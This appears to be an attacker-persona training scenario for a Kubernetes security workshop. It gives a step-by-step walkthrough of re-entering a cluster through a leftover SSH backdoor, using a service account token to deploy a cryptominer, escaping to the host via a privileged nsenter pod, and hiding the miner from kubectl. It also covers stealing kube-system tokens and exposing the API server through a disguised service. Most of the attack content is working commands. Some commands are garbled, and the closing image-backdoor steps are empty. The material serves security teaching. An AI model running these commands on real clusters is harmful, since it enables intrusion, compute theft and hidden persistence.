# Persistence: Scenario 2 Attack

## Backstory

### Name: __Red__

* Opportunist
* Easy money via crypto-mining
* Uses automated scans of web IP space looking for known exploits and vulnerabilities

### Motivations

* __Red__ notices that public access to the cluster is gone and the cryptominers have stopped reporting in
* __Red__ is excited to discover that the SSH server they left behind is still active

## Re-establishing a Foothold

__Red__ reconnects to the cluster using the SSH service disguised as a *metrics-server* on the cluster. While having access to an individual container may not seem like much of a risk at first glance, this container has two characteristics that make it very dangerous:
  * There is a service account associated with the container which has been granted access to all kubernetes APIs
  * The container is running with a privileged security context which grants it direct access to the host OS

## Deploying Miners

Connect to the cluster via SSH:
```console
echo "Sup3r_S3cr3t_P@ssw0rd" > ssh root@<service IP from attack 1>:8080
```

To restart our crypto mining, we will need the token for the pod service account:
```console
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

We also want to make sure we are creating the new miners in the same namespace:
```console
export NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
```

And we will be connecting to the kubernetes API from inside the cluster this time:
```console
export API_SERVER="https://kubernetes.default.svc"
```

Now the fun part, let's create our miner:
```console
curl -k -X POST "$API_SERVER/api/v1/namespaces/$NAMESPACE/pods" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --data-binary '{"apiVersion":"apps/v1","kind":"Deployment","metadata":{"labels":{"run":"bitcoinero"},"name":"bitcoinero","namespace":"dev"},"spec":{"replicas":1,"revisionHistoryLimit":2,"selector":{"matchLabels":{"run":"bitcoinero"}},"strategy":{"rollingUpdate":{"maxSurge":"25%","maxUnavailable":"25%"},"type":"RollingUpdate"},"template":{"metadata":{"labels":{"run":"bitcoinero"}},"spec":{"containers":[{"image":"securekubernetes/bitcoinero:latest","name":"bitcoinero","command":["./moneymoneymoney"],"args":["-c","1","-l","10"],"resources":{"requests":{"cpu":"100m","memory":"128Mi"},"limits":{"cpu":"200m","memory":"128Mi"}}}]}}}}'
```

Review the information. Check for Kubernetes access, and find the limits of our permissions:

```console
export PATH=/tmp:$PATH
cd /tmp; curl -LO https://dl.k8s.io/release/v1.28.10/bin/linux/amd64/kubectl; chmod 555 kubectl 
kubectl get pods
kubectl get pods --all-namespaces
kubectl get nodes
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i create pods -n dev
kubectl auth can-i create pods -n prd
kubectl auth can-i create pods -n kube-system
```

Now that we've reviewed the basic limits of our access, let's see if we can take over the host. If we can, that will give us many more options to fulfill our nefarious whims.

Using <a href="https://twitter.com/mauilion/status/1129468485480751104" target="_blank">a neat trick from Twitter</a>, let's attempt to deploy a container that gives us full host access:

```console
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```

Let's unpack this a little bit: The kubectl run gets us a pod with a container, but the --overrides argument makes it special.

First we see `"hostPID": true`, which breaks down the most fundamental isolation of containers, letting us see all processes as if we were on the host.

Next, we use the nsenter command to switch to a different `mount` namespace. Which one? Whichever one init (pid 1) is running in, since that's guaranteed to be the host `mount` namespace! The result is similar to doing a `HostPath` mount and `chroot`-ing into it, but this works at a lower level, breaking down the `mount` namespace isolation completely. The `privileged` security context is necessary to prevent a permissions error accessing `/proc/1/ns/mnt`.

Convince yourself that you're really on the host, using some of our earlier enumeration commands:

```console
id; uname -a; cat /etc/lsb-release /etc/redhat-release; ps -ef; env | grep -i kube
```

It's been said that "if you have to SSH into a server for troubleshooting, you're doing Kubernetes wrong", so it's unlikely that cluster administrators are SSHing into nodes and running commands directly.  

AKS doesn't use Docker, so instead we'll need to use `crictl` instead.  By deploying our bitcoinero container via Docker on the host, it will show up in a `crictl ps` listing.  However, containerd is managing the container directly and not the `kubelet`, so the malicious container _won't show up in a `kubectl get pods`_ listing.  Without additional detection capabilities, it's likely that the cluster administrator will never even notice.

First we verify Docker is working as expected, then deploy our cryptominer, and validate it seems to be running.  For this, we will use `ctr`, the containerd CLI.

```console
ctr containers ls
```

```console
# ctr does not auto-pull images
ctr images pull docker.io/securekubernetes/bitcoinero:latest

ctr run -d docker.io/securekubernetes/bitcoinero:latest bitcoinero "/moneymoneymoney" "-c 1 -l 10"
```

```console
# Verify the container is running
ctr container ls

# Verify the container doesn't show up in the pod list
kubectl --kubeconfig /var/lib/kubelet/kubeconfig get pods -A
```

## Digging In
Now that __DarkRed__ has fulfilled her end of the agreement and the miners are reporting in again, she decides to explore the cluster. With root access to the host, it's easy to explore any and all of the containers. Inspecting the production web app gives access to a customer database that may be useful later -- she grabs a copy of it for "safekeeping".

It would be nice to leave a backdoor for future access. Let's become __DarkRed__ again and see what we can do:

First, let's steal the kubelet's client certificate, and check to see if it has heightened permissions:

```console
ps -ef | grep kubelet
```

Note the path to the kubelet's kubeconfig file: /var/lib/kubelet/kubeconfig

```console
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system
```

Looks good! Let's try it:

```console
kubectl --kubeconfig /var/lib/kubelet/kubeconfig run testing --image=busybox --rm -i -t -n kube-system --command echo "success"
```

Oh no! This isn't going to work. Let's try stealing the default kube-system service account token and check those permissions. We'll need to do a little UNIX work to find them, since we're not exactly using the public API.


```console
TOKEN=$(for i in `mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'`; do if [ `cat $i` = 'kube-system' ]; then cat `echo $i | sed 's/.namespace$/\/token/'`; break; fi; done)
echo -e "\n\nYou'll want to copy this for later:\n\nTOKEN=\"$TOKEN\""
```

```console
kubectl --token "$TOKEN" --insecure-skip-tls-verify --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT auth can-i get secrets --all-namespaces
```
Yes, this looks better! We save that token in our PalmPilot for later use, and publish a NodePort that will let us access the cluster remotely in the future:

```console
cat <<EOF | kubectl --kubeconfig /var/lib/kubelet/kubeconfig apply -f -
apiVersion: v1
kind: Service
metadata:
  name: istio-mgmt
spec:
  type: LoadBalancer
  ports:
    - protocol: TCP
      port: 31313
      targetPort: $KUBERNETES_SERVICE_PORT
---
apiVersion: v1
kind: Endpoints
metadata:
  name: istio-mgmt
subsets:
  - addresses:
      - ip: `sed -n 's/^  *server: https:\/\///p' /var/lib/kubelet/kubeconfig`
    ports:
      - port: $KUBERNETES_SERVICE_PORT
EOF
```

Press control-d to exit (and delete) the `r00t` pod.

If you like, you may validate that external access is working, using cloud shell:

```console
if [ -z "$TOKEN" ]; then
  echo -e "\n\nPlease paste in the TOKEN=\"...\" line and try again."
else
  EXTERNAL_IP=`gcloud compute instances list --format json | jq '.[0]["networkInterfaces"][0]["accessConfigs"][0]["natIP"]' | sed 's/"//g'`
  kubectl --token "$TOKEN" --insecure-skip-tls-verify --server "https://${EXTERNAL_IP}:31313" get pods --all-namespaces
fi
```

Now we have remote Kubernetes access, and our associate's bitcoinero containers are invisible. All in a day's work.

## Future Proofing

__Red__ has already been discovered once on this system. Luckily we left a backdoor last time. We should probably do that again. This time, let's hide our miner inside of a legitimate application. Then we won't even need access to the cluster anymore, whenever the owner of the cluster runs their apps, our miners will get spun up right along with them.

To get started we need to escape the container and gain access to the host OS:
```console
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
chroot /mnt/hola
```
And just like that you are now root on the host node!

Next we need to figure out where the container images are coming from:
```console
kubectl get deployment <deployment-name> -n prod -o jsonpath="{.spec.template.spec.containers[*].image}"
```

Now let's add our crypto miner to the application image:
```console
```

And then we push our modified image to the repository, replacing the existing image. 
```console
```

Now, all future instances of the application that launch on this cluster will run our crypto miner alongside their application!

Time for some celebratory pizza!